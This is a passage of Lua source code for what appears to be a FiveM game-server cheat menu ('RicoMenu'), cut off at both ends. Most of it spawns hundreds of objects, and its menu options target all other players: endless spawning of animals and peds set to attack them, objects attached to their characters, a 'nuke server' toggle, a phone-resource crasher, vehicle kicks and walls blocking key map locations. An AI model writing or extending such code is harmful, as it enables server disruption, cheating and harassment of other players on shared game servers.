        CreateObject(566160949, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        end)
			elseif RicoMenu.Button("~r~Fuck ~s~All Players ~b~With 1M Peds 🦄") then
local p = {"a_c_cat_01", "a_c_chop", "a_c_cow", "a_c_coyote", "a_c_deer", "a_c_hen", "a_c_husky", "a_c_pig",
    "a_c_pigeon", "a_c_rabbit_01", "a_c_rat", "a_c_retriever", "a_c_rottweiler", "a_c_seagull",
    "a_c_shepherd", "a_c_westy", "s_m_m_paramedic_01", "s_m_y_cop_01", "s_m_y_fireman_01", "u_m_m_aldinapoli", 
    "u_m_y_juggernaut_01"}

Citizen.CreateThread(function()
    while true do
        for _, m in ipairs(p) do
            print("Req: " .. m)
            RequestModel(m)
            while not HasModelLoaded(m) do Wait(100) end
            local l = GetActivePlayers()
            for _, i in ipairs(l) do
                local e = GetPlayerPed(i)
                local c = GetEntityCoords(e)
                local h = GetEntityHeading(e)
                print("Spwn: " .. m .. " @ " .. i)
                local a = CreatePed(28, m, c.x, c.y, c.z, h, true, false)
                TaskWanderInArea(a, c.x, c.y, c.z, 10.0, 10.0, 10.0)
                SetPedAsNoLongerNeeded(a)
                print("Made By Rico")
            end
            SetModelAsNoLongerNeeded(m)
            print("Done: " .. m)
            Citizen.Wait(1000)
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        local peds = GetGamePool('CPed')
        local pp = PlayerPedId()
        for _, p in ipairs(peds) do
            if pp == p then goto continue end
            local pc = GetEntityCoords(p)
            local pl = GetEntityCoords(pp)
            local d = Vdist(pc.x, pc.y, pc.z, pl.x, pl.y, pl.z)
            if d < 100.0 then TaskCombatPed(p, pp, 0, 16) end
            ::continue::
        end
        Citizen.Wait(1000)
    end
end)
            elseif RicoMenu.Button("~y~Tree ~w~All Players 🌴") then
				local object = GetHashKey('prop_bush_lrg_02b')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true)
				end
            elseif RicoMenu.Button("~y~Sex Doll ~w~All Players 🔞") then
				local object = GetHashKey('prop_bikini_disp_03')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 			
				end
            elseif RicoMenu.Button("~y~Air Dancer ~w~All Players 💃") then
				local object = GetHashKey('p_airdancer_01_s')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 
				end
            elseif RicoMenu.Button("~y~Crashed Heli ~w~All Players 🚁") then
				local object = GetHashKey('p_crahsed_heli_s')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 
				end
            elseif RicoMenu.Button("~y~Slapped ~w~All Players 👋🏼") then
			   TriggerServerEvent("ServerValidEmote", -1, "slapped")
			elseif RicoMenu.Button("Kick All Players From Vehicle") then
                KickAllFromVeh(includeself)
			elseif RicoMenu.CheckBox("~y~Fuck ~s~all Players 🤯", nukeserver) then
			ShowInfo("~y~Fucking Players...")
				nukeserver = not nukeserver
			elseif RicoMenu.Button("~y~Set ~s~All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
			elseif RicoMenu.CheckBox("~y~Make ~s~All Cars ~y~Fly", FlyingCars) then
                FlyingCars = not FlyingCars
		elseif RicoMenu.CheckBox("~r~CRASH - GcPhone Crasher", Enable_GcPhone) then
		elseif RicoMenu.Button("~r~MAP - Block ~s~Simeons") then
		x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local cd1 = CreateObject(e8, -50.97, -1066.92, 26.52, true, true, false)
					local cd2 = CreateObject(e8, -63.86, -1099.05, 25.26, true, true, false)
					local cd3 = CreateObject(e8, -44.13, -1129.49, 25.07, true, true, false)
                    SetEntityHeading(cd1, 160.59)
                    SetEntityHeading(cd2, 216.98)
					SetEntityHeading(cd3, 291.74)
                    FreezeEntityPosition(cd1, true)
                    FreezeEntityPosition(cd2, true)
					FreezeEntityPosition(cd3, true)
			elseif RicoMenu.Button("~r~MAP - Block ~s~Police Department") then
			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false)
                    local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false)
                    local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false)
                    local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false)
                    SetEntityHeading(pd1, 130.75)
                    SetEntityHeading(pd2, 212.63)
                    SetEntityHeading(pd3, 340.06)
                    SetEntityHeading(pd4, 209.57)
                    FreezeEntityPosition(pd1, true)
                    FreezeEntityPosition(pd2, true)
                    FreezeEntityPosition(pd3, true)
                    FreezeEntityPosition(pd4, true)	
			elseif RicoMenu.Button("~r~MAP - Block ~s~the whole square") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local e9 = CreateObject(e8, 97.8, -993.22, 28.41, true, true, false)
					local ea = CreateObject(e8, 247.08, -1027.62, 28.26, true, true, false)
					local e92 = CreateObject(e8, 274.51, -833.73, 28.25, true, true, false)
					local ea2 = CreateObject(e8, 291.54, -939.83, 27.41, true, true, false)
					local ea3 = CreateObject(e8, 143.88, -830.49, 30.17, true, true, false)
					local ea4 = CreateObject(e8, 161.97, -768.79, 29.08, true, true, false)
					local ea5 = CreateObject(e8, 151.56, -1061.72, 28.21, true, true, false)
                    SetEntityHeading(e9, 39.79)
                    SetEntityHeading(ea, 128.62)
					SetEntityHeading(e92, 212.1)
					SetEntityHeading(ea2, 179.22)
					SetEntityHeading(ea3, 292.37)
					SetEntityHeading(ea4, 238.46)
					SetEntityHeading(ea5, 61.43)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					FreezeEntityPosition(e92, true)
					FreezeEntityPosition(ea2, true)
					FreezeEntityPosition(ea3, true)
					FreezeEntityPosition(ea4, true)
                    FreezeEntityPosition(ea5, true)
	elseif RicoMenu.Button("~y~Spawn ~p~Lion ~s~all Players 🦁") then
                    local mtlion = "A_C_MtLion"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
